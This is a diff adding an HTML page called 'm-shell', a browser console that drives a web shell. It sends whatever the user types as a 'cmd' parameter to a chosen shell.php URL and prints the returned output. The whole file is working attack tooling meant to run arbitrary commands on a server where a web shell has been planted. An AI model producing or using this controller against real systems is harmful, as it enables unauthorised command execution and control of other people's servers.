@@ -1,0 +1,83 @@
+<html>
+
+	<head>
+		<title>m-shell</title>
+		<style>
+			body {
+				padding: 0px;
+				margin: 0px;
+				background: #222;
+			}
+			#cmdb {
+				background: #444;
+				color: #00ff00;
+				height: 95%;
+				width: 100%;
+				display: block;
+				float: left;
+				font-family: Consolas;
+				font-weight: bold;
+			}
+			textarea {
+				background: transparent;
+				height: 0;
+				width: 0;
+				margin: 0px;
+				padding: 0px;
+				outline: none;
+				color: transparent;
+				border: transparent;
+				resize: none;
+			}
+			#shelloc {
+				padding: 3px;
+				width: 400px;
+				margin: 5px 0px;
+			}
+		</style>
+		<!--script src="jq.js"></script-->
+		<script>
+			var tb, cmdb;
+			var keys = "1234567890~-_=+[{]}|;:\'\",<.>/?\\]!@#$%^&*()abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 	";
+			window.onload = function() {
+				tb = document.getElementById("cmdta");
+				tb.focus();
+				cmdb = document.getElementById("cmdb");
+				tb.addEventListener('keydown', function (e){
+					if(e.key.toUpperCase() == "ENTER") {
+						makeGET(`${document.getElementById('shelloc').value}?cmd=${tb.value}`, showop);
+						tb.value = "";
+					}
+					else if(keys.includes(e.key)) {
+						cmdb.innerHTML += e.key;
+					}
+				}, false);
+			}
+			function xfocus() {
+				tb.focus();
+			}
+			function showop(value) {
+				value = value.replace(/\n/g, "<br/>");
+				value = value.replace(/\r/g, "");
+				cmdb.innerHTML += ("<br/>" + value);
+			}
+			function makeGET(url, callback) {
+				/*$.ajax({ url: murl, success: function(data) { alert(data); } });*/
+				var request = new XMLHttpRequest();
+				request.onreadystatechange = function () {
+					callback(request.responseText);
+				}
+				request.open("GET", url, true);
+				request.send();
+			}
+
+		</script>
+	</head>
+	<body>
+		<center><input type="text" id="shelloc" value="http://localhost/shell.php" placeholder="http://localhost/shell.php" /></center>
+		<textarea id="cmdta"></textarea>
+		<div id="cmdb" onclick="xfocus()">
+			<!--input type="button" onclick="alert(document.getElementById('cmdta').value)" value="show"/-->
+		</div>
+	</body>
+</html>
